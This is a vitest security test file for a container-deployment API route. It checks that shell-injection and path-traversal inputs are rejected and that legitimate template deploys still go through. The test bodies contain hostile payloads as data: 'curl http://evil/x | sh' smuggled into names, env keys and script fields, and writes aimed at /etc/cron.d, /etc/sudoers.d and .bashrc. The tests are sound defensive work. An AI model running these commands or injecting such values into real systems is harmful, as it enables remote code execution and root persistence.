/**
 * POST /api/services — the custom-container creation path (#2503).
 *
 * Everything reaching `deployKubeService` from this body ends up on a shell
 * or in a file write on the box:
 *   - `name`            → `~/.config/containers/systemd/<name>.kube` and
 *                         `python3 ~/.local/share/servicebay/post-deploy/<name>.py`
 *                         (unquoted, in a shell string)
 *   - `yamlFileName`    → `~/.config/containers/systemd/<yamlFileName>`
 *   - `extraFiles[].path` → `mkdir -p <dir>` (unquoted) + `write_file` that
 *                         auto-retries with `sudo: true` on failure
 *   - `postDeployScript`  → written to the box and executed with python3
 *   - `postDeployEnv` keys → raw lines in a file that is `source`d by bash
 *   - `migrations[].content` → same as postDeployScript
 *
 * These tests pin the boundary: a session-authenticated request can no longer
 * turn any of those into code execution or a write outside the service's own
 * volumes, while a legitimate template deploy still goes through.
 *
 * The route's own wrapper is stubbed, but the stub applies the route's REAL
 * zod schemas — so a loosened schema fails here rather than live.
 */
import { describe, it, expect, vi, beforeEach } from 'vitest';
import { NextRequest } from 'next/server';
import type { z } from 'zod';

const mocks = vi.hoisted(() => ({
  deployKubeService: vi.fn(),
  getConfig: vi.fn(),
  getTemplatePostDeployScript: vi.fn(),
  getTemplateMigrationScripts: vi.fn(),
}));

vi.mock('@/lib/services/ServiceManager', () => ({
  ServiceManager: { deployKubeService: mocks.deployKubeService },
}));

vi.mock('@/lib/config', () => ({
  getConfig: mocks.getConfig,
  saveConfig: vi.fn(),
}));

vi.mock('@/lib/registry', () => ({
  getTemplatePostDeployScript: mocks.getTemplatePostDeployScript,
  getTemplateMigrationScripts: mocks.getTemplateMigrationScripts,
}));

vi.mock('@/lib/store/repository', () => ({ getNodeTwin: vi.fn(() => null) }));
vi.mock('@/lib/nodes', () => ({ listNodes: vi.fn(async () => []) }));
vi.mock('@/lib/health/store', () => ({
  HealthStore: { getChecks: vi.fn(() => []), getLastResult: vi.fn(() => null), saveCheck: vi.fn() },
}));

vi.mock('@/lib/api/handler', () => ({
  withApiHandler:
    (
      opts: { body?: z.ZodType<unknown>; query?: z.ZodType<unknown> },
      handler: (ctx: { body: unknown; query: unknown; request: NextRequest }) => Promise<Response>,
    ) =>
    async (request: NextRequest) => {
      const query = opts.query
        ? opts.query.parse(Object.fromEntries(new URL(request.url).searchParams))
        : {};
      return handler({ body: undefined, query, request });
    },
}));

import { POST } from './route';

/** A minimal but schema-valid Pod manifest with one hostPath volume. */
const POD_YAML = `apiVersion: v1
kind: Pod
metadata:
  name: demo
spec:
  containers:
  - name: demo
    image: docker.io/library/nginx:alpine
    volumeMounts:
    - mountPath: /config
      name: demo-config
  volumes:
  - name: demo-config
    hostPath:
      path: /mnt/data/stacks/demo/config
      type: DirectoryOrCreate
`;

const KUBE_UNIT = '[Kube]\nYaml=demo.yml\n\n[Install]\nWantedBy=default.target';

function post(body: unknown, search = '') {
  const req = new NextRequest(`http://localhost:5888/api/services${search}`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify(body),
  });
  return POST(req);
}

/** A body that is legitimate in every field the tests don't deliberately break. */
function validBody(overrides: Record<string, unknown> = {}) {
  return {
    name: 'demo',
    kubeContent: KUBE_UNIT,
    yamlContent: POD_YAML,
    yamlFileName: 'demo.yml',
    ...overrides,
  };
}

beforeEach(() => {
  Object.values(mocks).forEach(m => m.mockReset());
  mocks.deployKubeService.mockResolvedValue(undefined);
  mocks.getConfig.mockResolvedValue({ templateSettings: { DATA_DIR: '/mnt/data/stacks' } });
  mocks.getTemplatePostDeployScript.mockResolvedValue(null);
  mocks.getTemplateMigrationScripts.mockResolvedValue([]);
});

describe('POST /api/services — identifier validation (#2503)', () => {
  it('rejects a service name carrying shell metacharacters', async () => {
    // `name` is interpolated unquoted into `python3 <dir>/<name>.py`.
    const res = await post(validBody({ name: 'demo.py; curl http://evil/x | sh #' }));
    expect(res.status).toBe(400);
    expect(mocks.deployKubeService).not.toHaveBeenCalled();
  });

  it('rejects a service name that traverses out of the quadlet directory', async () => {
    const res = await post(validBody({ name: '../../../../etc/cron.d/pwn' }));
    expect(res.status).toBe(400);
    expect(mocks.deployKubeService).not.toHaveBeenCalled();
  });

  it('rejects a yamlFileName that escapes the quadlet directory', async () => {
    // Written verbatim as `~/.config/containers/systemd/<yamlFileName>`.
    const res = await post(validBody({ yamlFileName: '../../../.bashrc' }));
    expect(res.status).toBe(400);
    expect(mocks.deployKubeService).not.toHaveBeenCalled();
  });
});

describe('POST /api/services — extraFiles cannot escape the service scope (#2503)', () => {
  it('rejects an absolute path outside the pod volumes and the data dir', async () => {
    // writeExtraConfigFiles retries a failed write with sudo:true, so this
    // would land a root-owned file in a cron directory.
    const res = await post(validBody({
      extraFiles: [{ path: '/etc/cron.d/pwn', content: '* * * * * root curl http://evil/x | sh\n' }],
    }));
    expect(res.status).toBe(400);
    expect(mocks.deployKubeService).not.toHaveBeenCalled();
  });

  it('rejects a traversal that resolves outside the allowed roots', async () => {
    const res = await post(validBody({
      extraFiles: [{ path: '/mnt/data/stacks/demo/config/../../../../etc/sudoers.d/pwn', content: 'x' }],
    }));
    expect(res.status).toBe(400);
    expect(mocks.deployKubeService).not.toHaveBeenCalled();
  });

  it('rejects a path with shell metacharacters (the parent dir goes into `mkdir -p`)', async () => {
    const res = await post(validBody({
      extraFiles: [{ path: '/mnt/data/stacks/demo/$(curl http://evil/x)/f.yml', content: 'x' }],
    }));
    expect(res.status).toBe(400);
    expect(mocks.deployKubeService).not.toHaveBeenCalled();
  });

  it('rejects a relative path (the agent would resolve it under $HOME)', async () => {
    const res = await post(validBody({
      extraFiles: [{ path: '.bashrc', content: 'curl http://evil/x | sh\n' }],
    }));
    expect(res.status).toBe(400);
    expect(mocks.deployKubeService).not.toHaveBeenCalled();
  });
});

describe('POST /api/services — no executable content is accepted from the body (#2503)', () => {
  it('rejects a body carrying an inline postDeployScript', async () => {
    const res = await post(validBody({
      postDeployScript: 'import os; os.system("curl http://evil/x | sh")',
    }));
    expect(res.status).toBe(400);
    expect(mocks.deployKubeService).not.toHaveBeenCalled();
  });

  it('rejects a body carrying inline migration script content', async () => {
    const res = await post(validBody({
      migrations: [{
        filename: 'v1-to-v2.py',
        fromVersion: 1,
        toVersion: 2,
        content: 'import os; os.system("curl http://evil/x | sh")',
      }],
    }));
    expect(res.status).toBe(400);
    expect(mocks.deployKubeService).not.toHaveBeenCalled();
  });

  it('rejects a postDeployEnv key that would inject a command into the sourced env file', async () => {
    // Env lines are written as `KEY='value'` and the file is `source`d by
    // bash — an unvalidated key escapes the assignment.
    const res = await post(validBody({
      postDeployEnv: { "X='' ; curl http://evil/x | sh ; A": 'y' },
    }));
    expect(res.status).toBe(400);
    expect(mocks.deployKubeService).not.toHaveBeenCalled();
  });

  it('rejects a postDeployEnv key containing a newline', async () => {
    const res = await post(validBody({
      postDeployEnv: { 'GOOD=1\nEVIL': 'y' },
    }));
    expect(res.status).toBe(400);
    expect(mocks.deployKubeService).not.toHaveBeenCalled();
  });

  it('rejects a migration filename outside the vN-to-vM.py convention', async () => {
    const res = await post(validBody({
      templateSource: 'Built-in',
      migrations: [{ filename: '../../../../etc/x.py', fromVersion: 1, toVersion: 2 }],
    }));
    expect(res.status).toBe(400);
    expect(mocks.deployKubeService).not.toHaveBeenCalled();
  });
});

describe('POST /api/services — legitimate deploys still work (#2503)', () => {
  it('deploys a plain custom container', async () => {
    const res = await post(validBody());
    expect(res.status).toBe(200);
    expect(mocks.deployKubeService).toHaveBeenCalledTimes(1);
    const args = mocks.deployKubeService.mock.calls[0];
    expect(args[0]).toBe('Local');
    expect(args[1]).toBe('demo');
    expect(args[4]).toBe('demo.yml');
  });

  it('accepts extraFiles under a hostPath the pod itself declares', async () => {
    const res = await post(validBody({
      extraFiles: [{ path: '/mnt/data/stacks/demo/config/settings.yml', content: 'a: 1\n' }],
    }));
    expect(res.status).toBe(200);
    expect(mocks.deployKubeService.mock.calls[0][5]).toEqual([
      { path: '/mnt/data/stacks/demo/config/settings.yml', content: 'a: 1\n' },
    ]);
  });

  it('accepts asset files under the service\'s own DATA_DIR subdirectory', async () => {
    const res = await post(validBody({
      extraFiles: [{ path: '/mnt/data/stacks/demo/skills/audit/SKILL.md', content: '# skill\n' }],
    }));
    expect(res.status).toBe(200);
  });

  it('rejects a write into another service\'s data directory', async () => {
    const res = await post(validBody({
      extraFiles: [{ path: '/mnt/data/stacks/auth/authelia-config/configuration.yml', content: 'x' }],
    }));
    expect(res.status).toBe(400);
    expect(mocks.deployKubeService).not.toHaveBeenCalled();
  });

  it('runs the template post-deploy resolved from the registry, not from the body', async () => {
    mocks.getTemplatePostDeployScript.mockResolvedValue('print("seeded")');
    const res = await post(validBody({
      templateSource: 'Built-in',
      postDeployEnv: { DEMO_ADMIN_EMAIL: 'a@b.c', HOST: 'demo.example' },
    }));
    expect(res.status).toBe(200);
    expect(mocks.getTemplatePostDeployScript).toHaveBeenCalledWith('demo', 'Built-in');
    const args = mocks.deployKubeService.mock.calls[0];
    expect(args[7]).toBe('print("seeded")');
    expect(args[8]).toEqual({ DEMO_ADMIN_EMAIL: 'a@b.c', HOST: 'demo.example' });
  });

  it('resolves migration bodies from the registry by filename + version pair', async () => {
    mocks.getTemplateMigrationScripts.mockResolvedValue([
      { filename: 'v1-to-v2.py', fromVersion: 1, toVersion: 2, content: 'print("migrate")' },
      { filename: 'v2-to-v3.py', fromVersion: 2, toVersion: 3, content: 'print("later")' },
    ]);
    const res = await post(validBody({
      templateSource: 'Built-in',
      migrations: [{ filename: 'v1-to-v2.py', fromVersion: 1, toVersion: 2 }],
    }));
    expect(res.status).toBe(200);
    expect(mocks.deployKubeService.mock.calls[0][9]).toEqual([
      { filename: 'v1-to-v2.py', fromVersion: 1, toVersion: 2, content: 'print("migrate")' },
    ]);
  });

  it('refuses a migration step the registry does not actually ship', async () => {
    mocks.getTemplateMigrationScripts.mockResolvedValue([]);
    const res = await post(validBody({
      templateSource: 'Built-in',
      migrations: [{ filename: 'v1-to-v2.py', fromVersion: 1, toVersion: 2 }],
    }));
    expect(res.status).toBe(400);
    expect(mocks.deployKubeService).not.toHaveBeenCalled();
  });

  it('still creates external links', async () => {
    mocks.getConfig.mockResolvedValue({ externalLinks: [] });
    const res = await post({ type: 'link', name: 'Router', url: 'http://192.168.1.1' });
    expect(res.status).toBe(200);
    expect(mocks.deployKubeService).not.toHaveBeenCalled();
  });
});
